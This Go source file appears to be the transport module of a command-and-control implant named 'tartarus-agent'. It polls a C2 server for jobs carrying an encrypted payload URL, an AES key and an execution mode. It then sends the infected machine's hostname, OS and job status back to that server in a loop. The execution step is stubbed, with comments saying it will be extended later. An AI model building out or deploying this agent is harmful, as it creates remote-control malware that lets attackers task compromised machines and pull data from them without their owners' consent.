package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
	"os"
	"runtime"
	"tartarus-agent/config"
)

// JobResponse models a pending job returned from the server.
type JobResponse struct {
	JobID       string `json:"job_id"`
	PayloadURL  string `json:"payload_url"`
	EncAESKey   string `json:"enc_aes_key"`
	ExecMode    string `json:"exec_mode"`
	ResultR2Key string `json:"result_r2_key"`
}

// JobResult represents the result produced by the agent.
type JobResult struct {
	JobID     string `json:"job_id"`
	AgentID   string `json:"agent_id"`
	Status    string `json:"status"`
	Message   string `json:"message"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	Timestamp string `json:"timestamp"`
}

// executeJob performs the first harmless test execution.
//
// We are intentionally not executing arbitrary commands or code here.
// This is only verifying the job -> execution -> result pipeline.
func executeJob(job JobResponse, cfg config.AgentConfig) JobResult {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Hostname retrieval is kept simple for this first test.
	// We will improve the execution layer later.
	log.Printf(
		"[TARTARUS-AGENT] Executing job %s",
		job.JobID,
	)

	return JobResult{
		JobID:     job.JobID,
		AgentID:   cfg.AgentID,
		Status:    "success",
		Message:   "Test job executed successfully",
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

// submitResult sends the completed job result back to the backend.
func submitResult(cfg config.AgentConfig, result JobResult) error {
	url := fmt.Sprintf(
		"%s/results/submit",
		cfg.C2BaseURL,
	)

	data, err := json.Marshal(result)
	if err != nil {
		return err
	}

	resp, err := http.Post(
		url,
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf(
			"result submission failed: HTTP %d",
			resp.StatusCode,
		)
	}

	log.Printf(
		"[TARTARUS-AGENT] Result submitted for job %s",
		result.JobID,
	)

	return nil
}

func pollJobs(cfg config.AgentConfig) error {
	url := fmt.Sprintf(
		"%s/jobs/pending/%s",
		cfg.C2BaseURL,
		cfg.AgentID,
	)

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		log.Printf("[TARTARUS-AGENT] No pending jobs")
		return nil
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf(
			"job polling failed: HTTP %d",
			resp.StatusCode,
		)
	}

	var job JobResponse

	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
		return err
	}

	log.Printf(
		"[TARTARUS-AGENT] Job received: %s (mode=%s)",
		job.JobID,
		job.ExecMode,
	)

	// Execute the received job.
	result := executeJob(job, cfg)

	// Send the result back to the backend.
	if err := submitResult(cfg, result); err != nil {
		return err
	}

	return nil
}

// StartPollLoop starts the periodic job polling loop.
func StartPollLoop(cfg config.AgentConfig) {
	log.Printf(
		"[TARTARUS-AGENT] Starting job polling for agent %s",
		cfg.AgentID,
	)

	interval := time.Duration(cfg.PollMin) * time.Second

	if interval <= 0 {
		interval = 2 * time.Second
	}

	for {
		if err := pollJobs(cfg); err != nil {
			log.Printf(
				"[TARTARUS-AGENT] Poll error: %v",
				err,
			)
		}

		time.Sleep(interval)
	}
}
